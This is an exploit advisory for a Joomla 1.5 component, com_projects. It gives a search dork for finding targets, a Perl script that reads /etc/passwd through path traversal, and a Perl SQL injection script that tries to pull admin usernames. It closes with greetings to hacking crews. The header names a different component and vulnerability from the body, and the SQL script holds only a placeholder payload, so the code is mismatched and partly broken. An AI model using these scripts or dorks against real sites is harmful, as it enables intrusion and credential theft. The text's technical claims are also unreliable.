=========================================================
Joomla  Component com_projects LFI & SQL Vulnerability
=========================================================

[+]Title        : Joomla  Component com_calendrier RFI Vulnerability
[+]Author       : jos_ali_joe
[+]Contact      : josalijoe@yahoo.com
[+]Home 	: http://josalijoe.wordpress.com/		
######################################################################## 
Dork		: inurl:index.php?option="com_projects"
######################################################################## 
[ Software Information ]
########################################################################
[+] Vendor : http://www.codegravity.com/
[+] Download : http://www.joomla.org/download.html
[+] version : Joomla 1.5
[+] Vulnerability : LFI and SQL Vulnerability
[+] Dork : com_projects
########################################################################
[+] Exploit: LFI
====================================================================================
http://localhost/index.php?option=com_projects&controller=[ LFI ]
====================================================================================
use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;

print "\t\t########################################################\n\n";
print "\t\t#    Joomla  Component com_projects LFI Vulnerability  #\n\n";
print "\t\t#                        by jos_ali_joe                #\n\n";
print "\t\t########################################################\n\n";


if (!$ARGV[0])
{
print "Usage: perl idc.pl [HOST]\n";
print "Example: perl idc.pl http://localhost/LFI/\n";;
}

else
{

$web=$ARGV[0];
chomp $web;

$iny="agregar_info.php?tabla=../../../../../../../../../../../../../../../../etc/passwd%00";

my $web1=$web.$iny;
print "$web1\n\n";
my $ua = LWP::UserAgent->new;
my $req=HTTP::Request->new(GET=>$web1);
$doc = $ua->request($req)->as_string;

if ($doc=~ /^root/moxis ){
print "Web is vuln\n";
}
else
{
print "Web is not vuln\n";
}

}

####################################################################################
[+] Exploit: SQL
====================================================================================
http://localhost/index.php?option=com_projects&view=project&id=[ SQL ]
====================================================================================
use IO::Socket;
if(@ARGV < 1){
print "
[========================================================================
[//   Joomla Component com_projects SQL Injection Exploit
[//                   Usage: idc.pl [target]
[//                   Example: idc.pl localhost.com
[//                   Vuln&Exp : jos_ali_joe
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/index.php?option=com_projects&view=project&id=";
 
print "Script <DIR> : ";
$dir = <STDIN>;
chop ($dir);
 
if ($dir =~ /exit/){
print "-- Exploit Failed[You Are Exited] \n";
exit();
}
 
if ($dir =~ /\//){}
else {
print "-- Exploit Failed[No DIR] \n";
exit();
 }
 
 
$target = "SQL Injection Exploit";
$target = $host.$dir.$file.$target;
 
#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: * /*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /username:(.*?)pass/){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

####################################################################################
Thanks :
./kaMtiEz ? ibl13Z ? Xrobot ? tukulesto ? R3m1ck ? jundab - asickboys- Vyc0d ? Yur4kha - XPanda - eL Farhatz
./ArRay ? akatsuchi ? K4pt3N ? Gameover ? antitos ? yuki ? pokeng ? ffadill - Alecs - v3n0m - RJ45
./Kiddies ? pL4nkt0n ? chaer newbie ? andriecom ? Abu_adam ? Petimati - hakz ? Virgi ? Anharku - a17z a.k.a maho
./Me Family ATeN4 :
./N4ck0 - Aury - TeRRenJr - Rafael - aphe-aphe 
Greets For :
./Devilzc0de crew ? Kebumen Cyber ? Explore Crew ? Indonesian Hacker - Byroe Net - Yogyacarderlink - Hacker Newbie - Jatim Crew - Malang Cyber
My Team : ./Indonesian Coder